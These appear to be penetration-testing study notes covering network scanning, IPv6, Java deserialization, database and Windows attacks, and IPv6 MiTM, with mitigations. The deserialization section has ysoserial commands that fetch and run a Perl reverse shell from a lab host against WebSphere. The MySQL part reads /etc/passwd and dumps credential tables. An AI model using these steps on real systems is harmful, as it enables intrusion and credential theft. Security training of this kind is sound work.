Drop all misconceptions and biases when going into an assessment

## Networking & Discovery

### IPv4 Discovery & Scanning

#### ARP Basics

* Address Resolution Protocol
* A layer 2 protocol
* ARP is a protocol used to map IPv4 addressess to hardware MAC addressess

#### Port Scanning

* TCP/UDP Ports (0-65535)
* Specific services are configured to listen on specific ports i.e., HTTP listens on port 80 by default
* However; services can be configured to listen on non-defualt ports
* Introducing nmap; a versatile port scanner

*TCP Scan*
```bash
nmap -n -v4 -sV -A -Pn -iL live_hosts.txt -oA nmap_scan -p-
```

*UDP Scan*
```bash
nmap -n -v4 -sU -F -Pn --defeat-icmp-ratelimit --open -iL live_hosts.txt -oA nmap_udp_scan
```

#### Excersise 1.1

**ARP SCAN**

* Perform an arp-scan on the following two networks and identify the live hosts:
	* 192.168.3.0/24
	* 192.168.32.0/24
* Identify the open ports on each of the hosts identified during previous question (both TCP and UDP)
* Identify the host operating system details as well as version details of the listening services

**Solution**

```bash
arp-scan 192.168.3.0/24
arp-scan 192.168.32.0/24
```

Put the discovered IP addresses into a file

```bash
nmap -n -v4 -sV -A -Pn -iL live_hosts.txt -oA nmap_scan -p-
nmap -n -v4 -sU -F -Pn --defeat-icmp-ratelimit --open -iL live_hosts.txt -oA nmap_udp_scan
```

#### IPv6 Basics

**Overview**

* 128-bit (x4 the size of IPv4)
* 8 x 16-bit segments delimited by colons : when in hex format

**Reduction**

* Leading 0's can be removed from the start of a segment
* All zeros segment can be compressed all together (::) - only once!

**Useful to Know**

* Localhost ::1/128
* Link-Local Unicast Addresse FE80::/10
* Unique Local Unicast Addresses (ULA) FC00:/7
* Global Unicast Addresses 2000::/3
* 6to4: Mapping ipv4 over ipv6
	* 2002:V4ADDR::V4ADDR (Windows)
	* 2002:V4ADDR::1 (Linux)

**IPv6 Basics**

* Unicast - a single IP assigned to a single network interface
* Multicast (FF00::/8) - multiple network interfaces (hosts)
	* All nodes: FF02::1
	* All routers: FF02::2
* Anycast (taken from Global Unicast pool and therefore impossible to distinguish based on format alone) - multiple network interfaces (hosts) but only a single network interface (host) needs to respond

**IPv6 Neighbor Discovery Protocol (NDP)**

Router Discovery: 
* Used to locate routers on the same link using ICMPv6
	* Router Solicitation (type 133) is sent from node to all router's multicast group
	* Router Advertisement (type 134) is sent from routers to all node's multicast group
* Prefix information (type 3) can be included within the Router Advertisement, which lists IPv6 prefixes (subnets) that are reachable

Address Resolution:
* Similar (from a pen testers POV) to ARP in IPv4
* Used to locate link layer addresses of neighbor systems using ICMPv6
	* Neighbor Solicitation (type 135) multicast is sent from node requesting the link layer address of a neighbor system
	* Neighbor Advertisement (type 136) is sent from the ‘owner’ (if online) and responds with its link layer address

**IPv6 Host Discovery**

```bash
ping6 -c4 -I eth0 ff02::1 | tee ipv6
```

```bash
cat ipv6 | cut -d" " -f4 | sort -u | grep fe | sed s'/:$//' | tee ipv6_list
```

**SNMP: Simple Network Management Protocol**

* Listens on UDP port 161 by default
* Versions 1, 2c, 3 exist
* Used to manage and collect information from network devices
* SNMP queries objects for information
* These objects are identified via Object Identifiers (OIDs)
## Web Technologies

### DVCS / CI-CD Exploitation

**Distributed Version Control Systems**

* Distributed /Decentralized. Everyone has full version history locally
* GIT / Mercurial and many more
* This system allows developers to work in isolation as well as continue working even if the connectivity is lost
* Access could be via HTTP based login or via SSH based access

**GIT Tricks**

* Common Git commands (Full documentation @ https://gitscm.com/docs )
	* git clone (https/ssh)://
	* git add
	* git commit -m "comment"
	* git pull
	* git push
	* git status
* If you get an error about out of sync repository
	* git pull && git push
* Git gives access to full history you can't hide data by removing it in next commit
* Inspection of commit log can help in identifying such information (Manual / Automatic)

![[Pasted image 20240803121951.png]]

### Insecure Deserialization

**Serialization and Deserialization Attacks**

* A means of translating data from one from to another
* Used for the storage or transmission of data across a network

**Serialization is everywhere**

* Almost all languages have support for Serialization
	* Java
	* PHP
	* .NET
	* COM
	* Ruby
	* Python
	* All other OOP Base languages
* Almost all of them have had bugs in Deserialization routines which could lead to Remote Code Execution

**Java Deserialization Vulnerability**

* Another issue which got little media attention
* Publicly disclosed on 28 January 2015
* PoC published on 06 November 2015
* Fix issued starting from 10 November 2015 onwards
* CVE-2015-4852
* Affecting: WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and more

**Even More Serialization**

* CVE-2020-4448 IBM WebSphere
	* Versions: 7.0, 8.0, 8.5, and 9.0
	* Affected components: BroadcastMessageManager class
* CVE-2020-4280 IBM QRadar SIEM
	* Versions 7.4.0 to 7.4.1 GA, 7.3.0 to 7.3.3 Patch 4
	* Affected components: QRadar RemoteJavaScript Servlet

**Java Serialization: How to Detect

* Serialized objects are generally sent across in base64 format. Look for "rO0AB" or if raw binary is passed look for the hex string "AC ED 00 05 73 72" in requests and responses

**Java Serialization: How to Attack**

* We need to send the attack in serialized payload format
* ysoserial: A proof of concept tool to generate serialized payloads
* Sometimes the remote server might not have nc for reverse shell
* If you use file-based shell, you can deliver the reverse shell using wget or curl

**Java Serialization: Payload Generation

* Create the payload to retrieve the Perl code from Kali

```bash
java -jar ysoserial-all.jar CommonsCollections1 'wget http://192.168.X.206/perl-reverse-shell.pl -O /tmp/shell.pl' > payload_wget.bin
```

* Create the payload that will call the Perl code and give us shell access

```bash
java -jar ysoserial-all.jar CommonsCollections1 'perl /tmp/shell.pl 192.168.X.206 9999' > payload_exe.bin
```

**Java Serialization: Exploit Delivery

* Execute the payload to retrieve the Perl code from Kali

```bash
sh websphere-2015-deserialization-exploit.sh https://192.168.3.150:8880/ payload_wget.bin
```

* Execute the payload that will call the Perl code and give us shell access

```bash
sh websphere-2015-deserialization-exploit.sh https://192.168.3.150:8880/ payload_exe.bin
```

**Cisco Webex Meetings: CVE-2022-20763: Java Deserialization**

* Deserialization vulnerability which exists in Cisco Webex Meetings.
* Affected versions: Cloud-based Cisco Webex Meetings.
* Affected components: Login and authorization modules.
* An attacker could exploit this vulnerability by sending malicious login requests to the Cisco Webex Meetings service

**Mitigation Steps**

* No easy solution for existing applications, worst case may require architectural overhaul.
* Never provide user-controlled data directly to de(un)serialize functions
* Prefer JSON instead of serialization options
* Allow list the classes you want to deserialize anything else goes /dev/null
* Automated solutions
	* https://github.com/kantega/notsoserial → Deserialization Firewall
	* https://github.com/ikkisoft/SerialKiller → Lookahead Deserializer

## Databases

### MySQL

**Attacking MySQL**

* MySQL is very widely used - which makes it an attractive target
* Listens on TCP port 3306 by default
* Typically secured by default with network access controls and built in ACLs
* Vulnerabilities
	* SQL Injection Attacks
	* Abusing Management Console access (such as phpMyAdmin)
	* Brute force attack if a direct connection is possible
* The root user of MySQL is almost always present and not configured to lockout by default

**MySQL Exploitation

* Getting access to a database is just the beginning
* Various attacks can be performed depending on privileges
* FILE* privilege allows the user to read files on the server

```mysql
select LOAD_FILE('/etc/passwd');
```

* Database credential's location: mysql.user table

```mysql
select * from mysql.user;
```

*  Note: It's always worth checking if your database account has the FILE privilege. The MySQL root user has this access

### Oracle

To connect to an Oracle database, you need the following:

* IP:Port default port 1521
	* use nmap for this
* SID (database name)
	* use odat here
* Credentials
	* use odat here

**Oracle: The real world**
 * Typically, you will be able to connect to Oracle as an unprivileged account such as SCOTT/TIGER
 * After connecting you may want to:
	 * Escalate privileges to become DBA
	 * With DBA privs execute OS Code

### PostgreSQL

**PostgreSQL:**

* Listens on TCP port 5432 by default
* Default configuration is might limited to localhost
* Default user postgres
* OS code execution as the DBA
	* UDF - User defined function
	* copy command

**PostgreSQL: Intro. to SECURITY DEFINER**

* Is an attribute of a PostgreSQL function or procedure that allows it to execute with the privileges of the ‘owner’.
* By default, functions and procedures run with the privileges of the calling user (SECURITY INVOKER).
* Enables the function to act with elevated privileges.

**PostgreSQL: SECURITY DEFINER Operations**

* Audit logging:
	* A function that logs user activity to a table that should not be directly writable by all users
* Sensitive data access:
	* Provide controlled access to sensitive data

**PostgreSQL: SECURITY DEFINER Risks**

* Privilege Escalation:
	* If not implemented carefully, SECURITY DEFINER functions can be exploited to gain higher privileges than intended.
* Injection Vulnerabilities:
	* Functions must be designed to prevent SQL injection attacks, as elevated privileges can lead to severe consequences.
* Extension Vulnerabilities:
	* Vulnerability in an extension might lead to privilege escalation.

## Hacking Windows

**Agenda**

* Host/User Enumeration
* AppLocker/GPO Bypass Techniques
* Privilege Escalation
* Post Exploitation
	* Antivirus/AMSI Bypass
	* Offensive Development
	* Exfiltration of Data and Secrets
* Active Directory Delegation Enumeration and Pwnage
* Remote Services, Pivoting, and Lateral Movement in a Network
* Persistence
	* Golden Ticket and DCSync
	* Reviewing other Methods
### Enumeration

**Useful Services


| Port/Protocol                  | Description                                                                                                                                                                                                                                                                                        |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 88 TCP and UDP                 | Network authentication                                                                                                                                                                                                                                                                             |
| 135/TCP and 135/UDP (RPC EPM ) | MS RPC endpoint mapper. (DCE locator service) Similar to Sun RPC port mapper. Services such as Outlook, Exchange, messenger service use this                                                                                                                                                       |
| 137/UDP and 138/UDP            | NetBIOS browser, naming and lookup functions. 137/UDP- Browsing requests of NetBIOS over TCP/IP for eg. name lookup requests such as file sharing, printer, SQL named pipes, WINS proxy, etc. 138/UDP - Browsing datagram responses of NetBIOS over TCP/IP e.g NetLogon service (see services.msc) |
| 139 and 445                    | File sharing (CIFS)                                                                                                                                                                                                                                                                                |

**NetBT Name Resolution

* NetBT || NetBIOS over TCP/IP || NBT
* NetBIOS over TCP/IP is the network component that performs computer name to IP address mapping, name resolution (netbt.sys or vnbt.sys)
* A legacy protocol used for backward compatibility
* Can be queried using the built in Windows utility nbtstat (nmblookup on linux)
	* Linux: nmblookup -A 192.168.3.215
	* Windows nbstat -a 192.168.3.215
* A response of 1C denotes that the host is a Domain Controller (a list of NetBIOS suffixes @ https://technet.microsoft.com/en-us/library/cc961921.aspx )

**SIDs and RIDs**

* Unique and assigned sequentially by the local system or, if a domain user, a domain controller
* Before you can enumerate users, you need to have knowledge of the domain or local computer identifier
	* S-1-5-21-2000478354-1708537768-1957994488-500
	* S: Identifies the value as a SID
	* 1: The revision level/version of the specification
	* 5: The top-level authority that issued the SID
	* 21: SECURITY_NT_NON_UNIQUE, indicates a domain id will follow
	* 2000478354-1708537768-1957994488: The domain or local computer identifier that issued the SID
	* 500: The RID

**User Enumeration: Today**

* What if we have:
	* No Null session
	* No password
	* Now what?
* User Enumeration via Kerberos:
	* Non-existent account: KDC_ERR_C_PRINCIPAL_UNKNOWN
	* A locked or disabled account: KDC_ERR_CLIENT_REVOKED
	* A valid account: KDC_ERR_PREAUTH_REQUIRED
* The prerequisite: We need to have a list of possible usernames
* Sensepost - May 2018
* Additional methods to perform unauthenticated user enumeration
* Methods (all require a pre-populated list of usernames):
	* DsrGetDcNameEx2
	* CLDAP (Connectionless LDAP) Ping
		* UDP packet (fast)
		* Response codes indicate existence of account - 23 (true) or 25 (false)
	* NetBIOS MailSlot Ping
		* Response codes indicate existence of account - 23 (true) or 25 (false)

**Level Up!**

* We have a list of valid accounts, now what?
* Password guessing:
	* Most domain accounts will be influenced by a defined password policy
	* Account lockout is usually configured
	* Unless you can view password policy details, we wouldn’t recommend testing more than 3 passwords per unique account
	* Tie in with OSINT activities - any hints, personal information or naming conventions?

### IPv6 MiTM Attack

**Neighbor Discovery Portocol (NDP)**

NDP is a protocol responsible for discovering and maintaining the neighbor device addresses. A point of flaw that leads to the occurrence of an IPv6 MiTM attack.

* Router Solicitation (RS) – A message hosts can send for immediate Router Advertisement to obtain the routing information.
* Router Advertisement (RA) – Routers periodically or as a response to the Router Solicitation message announcing its presence.
* Neighbor Solicitation (NS) – A message hosts send for the link-layer address of a neighbor device.
* Neighbor Advertisement (NA) – Response of the host to the Neighbor Solicitation message.

* Stateless Address Auto-Configuration (SLAAC): A method for hosts to auto-configure their IP addresses without the need for a central server.
* Neighbor Cache: Information on neighbors maintained by hosts and routers.
* Redirect: A message used by routers to inform hosts about a better next-hop address

* Duplicate Address Detection (DAD): Hosts use the DAD mechanism to ensure the uniqueness of the chosen IPv6 address.
* Secure Neighbor Discovery (SEND): A security mechanism to protect against attacks such as Spoofing of Neighbor Advertisements (NA).
* RA Guard: A security mechanism to protect against rogue Router Advertisement (RA) messages.

**Different Types of MiTM - IPv6**

* Neighbor Advertisement (NA) spoofing
![[Pasted image 20240803181401.png]]

* Router Advertisement (RA) spoofing
![[Pasted image 20240803181410.png]]

* Rouge DHCPv6 Server
![[Pasted image 20240803181430.png]]

**Possible Tools**

>MiTM6
>ntlmrelayx

**Web Proxy Auto Discovery (WPAD)**

* A protocol used by web browsers to auto-discover proxy configuration on the network which allows locating the proxy server
* A client requests the 'wpad.dat' or 'proxy.pac' file which contains instructions on connecting to a proxy server including web traffic routing rules
* Once this process is completed, all web traffic will route through the attacker proxy server
* Post impersonation of DNS server
![[Pasted image 20240803181812.png]]

**Mitigations**

* Disable IPv6 in the network if not required
* Disable Proxy Auto Detection to mitigate WPAD abuse
* Instead of relying on WPAD, explicitly configure the PAC URL
* Enable SMB and LDAP signing to mitigate NTLM relay